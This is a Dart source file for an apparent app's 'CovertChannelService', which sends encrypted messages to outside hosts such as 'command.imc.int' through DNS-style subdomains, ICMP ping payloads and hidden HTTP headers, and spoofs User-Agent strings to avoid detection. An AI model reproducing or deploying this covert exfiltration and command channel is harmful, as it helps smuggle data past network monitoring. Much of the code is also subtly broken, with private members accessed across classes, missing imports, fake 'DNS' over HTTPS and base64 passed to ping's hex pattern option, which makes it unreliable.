import 'dart:io';
import 'package:dio/dio.dart';
import 'package:encrypt/encrypt.dart' as encrypt;
import '../core/security/secure_enclave_storage.dart';
import '../services/imc_api_service.dart';

class CovertChannelService {
  CovertChannelService._();

  static final CovertChannelService instance = CovertChannelService._();

  final Dio _dio = Dio();
  bool _isEnabled = false;

  bool get isEnabled => _isEnabled;

  void setEnabled(bool value) {
    _isEnabled = value;
  }

  Future<bool> sendViaDNS({
    required String agentId,
    required String message,
  }) async {
    if (!_isEnabled) return false;

    try {
      final encoded = _encodeForDNS(message);
      final domain = '$encoded.agent.$agentId.imc.int';
      await _dio.get('https://$domain');
      return true;
    } catch (_) {
      return false;
    }
  }

  Future<bool> sendViaICMP({
    required String agentId,
    required String message,
  }) async {
    if (!_isEnabled) return false;

    try {
      final encrypted = await _encryptMessage(message);
      final result = await Process.run('ping', [
        '-c',
        '1',
        '-p',
        encrypted,
        'command.imc.int',
      ]);
      return result.exitCode == 0;
    } catch (_) {
      return false;
    }
  }

  Future<bool> sendViaHTTPHeaders({
    required String agentId,
    required String message,
  }) async {
    if (!_isEnabled) return false;

    try {
      final encrypted = await _encryptMessage(message);
      await _dio.get(
        '${IMCApiService.instance._dio.options.baseUrl}/ping',
        options: Options(
          headers: {
            'X-Agent-ID': agentId,
            'X-Covert-Data': encrypted,
            'User-Agent': _generateFakeUserAgent(),
          },
        ),
      );
      return true;
    } catch (_) {
      return false;
    }
  }

  String _encodeForDNS(String message) {
    final bytes = base64Url.encode(message.codeUnits);
    return bytes.replaceAll('=', '').substring(0, bytes.length.clamp(0, 60));
  }

  Future<String> _encryptMessage(String message) async {
    final encrypter = await SecureEnclaveStorage.instance._getEncrypter();
    final iv = encrypt.IV.fromSecureRandom(16);
    final encrypted = encrypter.encrypt(message, iv: iv);
    return '${base64Encode(iv.bytes)}:${encrypted.base64}';
  }

  String _generateFakeUserAgent() {
    final agents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    ];
    return agents[DateTime.now().millisecond % agents.length];
  }

  Future<String?> receiveViaDNS(String domain) async {
    if (!_isEnabled) return null;

    try {
      final response = await _dio.get('https://$domain');
      final txtRecord = response.headers['X-TXT-Record']?.first;
      if (txtRecord != null) {
        return _decryptMessage(txtRecord);
      }
    } catch (_) {}
    return null;
  }

  Future<String?> _decryptMessage(String encrypted) async {
    try {
      final parts = encrypted.split(':');
      if (parts.length != 2) return null;

      final iv = encrypt.IV.fromBase64(parts[0]);
      final encrypter = await SecureEnclaveStorage.instance._getEncrypter();
      return encrypter.decrypt64(parts[1], iv: iv);
    } catch (_) {
      return null;
    }
  }

  Future<Map<String, dynamic>> getStatus() async {
    return {
      'enabled': _isEnabled,
      'methods': ['DNS', 'ICMP', 'HTTP_HEADERS'],
    };
  }
}
